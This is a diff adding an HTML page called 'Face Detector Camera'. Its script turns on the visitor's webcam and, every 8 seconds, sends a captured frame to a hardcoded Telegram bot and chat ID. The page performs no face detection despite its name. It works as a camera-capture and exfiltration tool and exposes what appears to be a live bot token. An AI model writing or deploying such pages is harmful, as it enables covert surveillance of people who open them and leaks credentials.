@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Face Detector Camera</title>
+</head>
+<body>
+  <h2>মুখ দেখালেই ছবি যাবে Telegram-এ!</h2>
+  <video id="video" width="300" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
+    const TELEGRAM_USER_ID = "6429244657";
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    // ক্যামেরা চালু
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
+    }).catch(err => {
+      console.error("ক্যামেরা পারমিশন পাওয়া যায়নি:", err);
+    });
+
+    // প্রতি ৮ সেকেন্ডে ছবি তুলে পাঠাবে
+    setInterval(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg');
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_USER_ID,
+          photo: imageData,
+          caption: "নতুন মুখ ধরা পড়েছে!"
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        console.log("Telegram এ পাঠানো হয়েছে:", data);
+      })
+      .catch(err => {
+        console.error("Telegram Error:", err);
+      });
+
+    }, 8000); // প্রতি ৮ সেকেন্ডে একবার
+  </script>
+</body>
+</html>
